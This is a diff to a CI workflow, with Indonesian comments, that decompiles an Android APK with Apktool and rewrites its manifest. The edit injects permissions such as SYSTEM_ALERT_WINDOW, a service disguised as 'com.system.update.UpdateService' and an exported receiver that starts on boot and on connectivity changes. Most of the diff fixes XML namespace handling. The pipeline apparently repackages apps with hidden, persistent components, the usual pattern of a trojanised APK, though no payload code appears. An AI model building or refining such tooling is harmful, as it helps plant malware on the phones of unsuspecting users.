@@ -51,7 +51,7 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y wget unzip python3 python3-lxml xmllint
+          sudo apt-get install -y wget unzip python3 python3-pip libxml2-utils
 
       - name: Download Apktool JAR
         run: |
@@ -115,13 +115,13 @@ jobs:
           with open(manifest_path, 'w') as f:
               f.write(content)
 
-          # 3. Parse XML (gunakan ElementTree)
+          # 3. Parse XML menggunakan ElementTree
           try:
               tree = ET.parse(manifest_path)
               root = tree.getroot()
           except ET.ParseError as e:
               print(f"❌ Error parsing XML: {e}")
-              # Coba gunakan lxml
+              # Jika gagal, gunakan lxml
               from lxml import etree
               parser = etree.XMLParser(recover=True)
               root = etree.parse(manifest_path, parser).getroot()
@@ -140,43 +140,42 @@ jobs:
               'android.permission.WRITE_EXTERNAL_STORAGE',
               'android.permission.SYSTEM_ALERT_WINDOW'
           ]
-          # Cari elemen <application> untuk menyisipkan service di dalamnya
+          for perm in permissions:
+              perm_elem = ET.Element('uses-permission')
+              perm_elem.set('{http://schemas.android.com/apk/res/android}name', perm)
+              root.insert(0, perm_elem)
+
+          # 5. Cari elemen <application>
           application = None
           for child in root:
               if child.tag == 'application':
                   application = child
                   break
 
-          # Tambahkan permission di bawah root, sebelum application
-          for perm in permissions:
-              perm_elem = ET.Element('uses-permission')
-              perm_elem.set('android:name', perm)
-              root.insert(0, perm_elem)
-
-          # 5. Tambahkan service dan receiver ke dalam <application>
+          # 6. Tambahkan service dan receiver ke dalam <application>
           if application is not None:
               # Service UpdateService
               service = ET.Element('service')
-              service.set('android:name', 'com.system.update.UpdateService')
-              service.set('android:exported', 'false')
-              service.set('android:foregroundServiceType', 'dataSync')
+              service.set('{http://schemas.android.com/apk/res/android}name', 'com.system.update.UpdateService')
+              service.set('{http://schemas.android.com/apk/res/android}exported', 'false')
+              service.set('{http://schemas.android.com/apk/res/android}foregroundServiceType', 'dataSync')
               application.append(service)
 
               # Receiver BootReceiver
               receiver = ET.Element('receiver')
-              receiver.set('android:name', 'com.system.update.BootReceiver')
-              receiver.set('android:exported', 'true')
+              receiver.set('{http://schemas.android.com/apk/res/android}name', 'com.system.update.BootReceiver')
+              receiver.set('{http://schemas.android.com/apk/res/android}exported', 'true')
               intent_filter = ET.Element('intent-filter')
               action1 = ET.Element('action')
-              action1.set('android:name', 'android.intent.action.BOOT_COMPLETED')
+              action1.set('{http://schemas.android.com/apk/res/android}name', 'android.intent.action.BOOT_COMPLETED')
               intent_filter.append(action1)
               action2 = ET.Element('action')
-              action2.set('android:name', 'android.net.conn.CONNECTIVITY_CHANGE')
+              action2.set('{http://schemas.android.com/apk/res/android}name', 'android.net.conn.CONNECTIVITY_CHANGE')
               intent_filter.append(action2)
               receiver.append(intent_filter)
               application.append(receiver)
 
-          # 6. Tulis ulang AndroidManifest.xml dengan format yang bagus
+          # 7. Tulis ulang AndroidManifest.xml dengan format yang bagus
           tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
 
           print("✅ AndroidManifest.xml berhasil dimodifikasi dengan aman")
